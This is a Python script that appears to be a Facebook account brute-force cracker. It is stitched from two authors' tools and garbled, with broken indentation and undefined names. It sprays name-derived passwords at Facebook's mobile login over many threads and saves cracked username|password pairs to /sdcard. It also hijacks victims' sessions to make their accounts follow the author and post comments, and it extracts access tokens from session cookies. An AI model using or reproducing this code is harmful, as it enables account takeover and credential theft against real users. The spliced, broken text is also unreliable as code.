###----------[ AUTHOR & CREATOR ]---------- ###
# ------ [ Gausah Dioprek Ntar Error ] ------ #
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Version   = '0.6'
Denventa  = 1827084332
Postingan = 10217173381366429

###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

###----------[ TIME ]---------- ###
id_dev = 345 - 340 + 720 - 723
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

###----------[ APPEND ]---------- ###
OK = []
CP = []
gabung_sandi = []
tempel_sandi = []

###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Author)    +  Codename
sakira = len(Facebook)  +  Codename
sakura = len(Instagram) +  Codename
sakera = len(Whatsapp)  +  Codename
sakora = len(YouTube)   +  Codename
ip_log = Denventa * id_dev - 3654168663

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('\n   %s[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
    print('       %s• %sTidak Dapat Mengeksekusi %s\n'%(M,A,error))
    print('   %s[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
    print('       %s• %sCookies/Token Invalid'%(M,A))
    print('       %s• %sSalah Memasukkan ID'%(M,A))
    print('       %s• %sBug Pada Source Code'%(M,A))
    print('       %s• %sBug Pada Requests'%(M,A))
    print('       %s• %sDan Lain-Lain\n'%(M,A))
    print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
    print('       %s• %spython sakera.py\n'%(M,A))
    exit()

###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    if ip_log != 1:pass
                    else:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)

###----------[ LOGO ]---------- ###
def poster():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(J,P,J,P,J,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,J,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(J,P,J,P,J,P,J,P,J,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(J,P,J,P,J,P,J,P,J,P,J,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,J,Version,P,J))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster2():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(H,P,H,P,H,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,H,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(H,P,H,P,H,P,H,P,H,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(H,P,H,P,H,P,H,P,H,P,H,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,H,Version,P,H))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster3():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(B,P,B,P,B,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,B,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(B,P,B,P,B,P,B,P,B,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(B,P,B,P,B,P,B,P,B,P,B,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,B,Version,P,B))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
     
   os.system('am start https://wa.me/+923047274393?text=' + tks)

			print("               \033[1;92m• Premium • \033[1;97m")

			print (' [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')

			print ("\033[1m [!] Tool    : Zeeshan Ahmad")

			print (" [!] Brand   : ZEESHSH")

			print(" [!] Expired : No limit")

			print (" [!] Status  : \033[1;92mFree\033[1;97m")

			print (' [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')

			print(" [1] Start Cracking  ")

			print(" [2] Create Supper File [ Ultimate ]")

			print(" [3] Feedback")

			print(" [4] WhatsApp Group")

			print(" [5] My Facebook Id ")

			print (" [0] Exit Programing")

			print (' [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')

			key = input(" [*] Choose : ")

			print (' [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]')

			if key in [""]:

				print (" [!] Please Select Correct Option")

				exit()

			elif key in ["1", "01"]:

				__xxx__().imtiaz(id)

			elif key in ["2", "02"]:

				

				os.system('python Dump.py')

			elif key in ["3", "03"]:

				

				dupcutter()

			elif key in ["4", "04"]:

				

				os.system("xdg-open https://chat.whatsapp.com/")

				R()

			elif key in ["5", "05"]:

				time.sleep(0.5)

				yt()

				R()

				login()

			elif key in ["0", "00" , "6"]:

				time.sleep(0.5)

				exit("\n [✓] Thank You\n")

class __xxx__:

    def __init__(self):

        self.id = []

    def imtiaz(self,ak):

        if 1 in fuck:

            os.system('#')

        

      

        

        self.cnt = input(' [*] Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.sarfrazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;33m[Zeehshsh]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"NokiaC5-05/22.5.007 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba+",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "dnt":"1",

                    "x-requested-with":"mark.via.gp",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://m.facebook.com/",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

                    "Host":cebok,

                    "cache-control":"max-age=0",

                    "upgrade-insecure-requests":"1",

                    "origin":"https://"+cebok,

                    "content-type":"application/x-www-form-urlencoded",

                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "x-requested-with":"XMLHttpRequest",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [Zeeshan-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Zeeshan_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={token}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        

                        wrt = '%s|%s' % (use,w)

                        cp.append(wrt)

                        open('/sdcard/Zeeshan_CP.txt' , 'a').write('%s\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:

                        pass

                    

                    wrt = '%s|%s' % (usr,w)

                    cp.append(wrt)

                    open('/sdcard/Zeeshan_CP.txt' , 'a').write('%s\n' % wrt)

                    break

                else:

                    continue

            loop+=1

        except:

            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://mbasic.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.parser')

        get = r.find('a', string='Ikuti').get('href')

        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):

        print(' [1] Crack With Auto Pass ')

        print(' [2] Crack With Name Digit Pass')

        chi = input('\n [?] Choose: ')

        if chi == '':

            print('\n   Select Correct One')

            self.__pler__()

        elif chi in ('1', '01'):

            os.system("clear")

            print(logo)

            print("\033[1;32m      Dont Forget Allah😊 \033[1;37m")

            print(" [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]")

            

            with sarfrazssb(max_workers=70) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+xz[1]]
                            
                            pwx = [name, xz[0] + 'last', xz[0] + 'Frist', xz[0] + 'Last']
                            
                            pwx = [name, xz[0]+xz[1]]

                        else:

                            pwx = [Last, xz[0] + 'Last1', xz[0] + 'first', xz[0] + 'last1']

                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        elif chi in ('2', '02'):

            os.system("clear")

            print(logo)

            print("")

            print("\033[1;37m\r   Enter Last Name Digits\033[1;37m\n")

            print ("\033[1;37m\r   Exmple : 123 + 12345 + 1234 + 1122\033[1;37m\n")

            p1 = input('   Name + 1 : ')

            p2 = input('   Name + 2 : ')

            p3 = input('   Name + 3 : ')

            p4 = input('   Name + 4 : ')

            os.system("clear")

            print(logo)

            print("\033[1;32m      Dont Forget Allah😊 \033[1;37m")

            print(" [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]")

            with sarfrazssb(max_workers=30) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]

                        else:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]

                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        else:

            print('\n Select Valid One')

            self.__pler__()

            

def dupcutter():

	os.system("xdg-open https://wa.me/+923047274393")

	time.sleep(3)

	R()

def yt():

	logo()

	os.system("xdg-open https://www.facebook.com/356")

	time.sleep(3)

	R()

    

class load:

    def __init__(self):

        _ = ''

        __ = int('30')

        ___ = int('0')

        __ -= 1

        ___ += 1

        for t in range(int("1")):

            print('\r Wait Bro Loading ...')

            sys.stdout.flush()

            time.sleep(0.1)

        print('\n')

if __name__ == '__main__':
    resik()
    tampilan_menu()
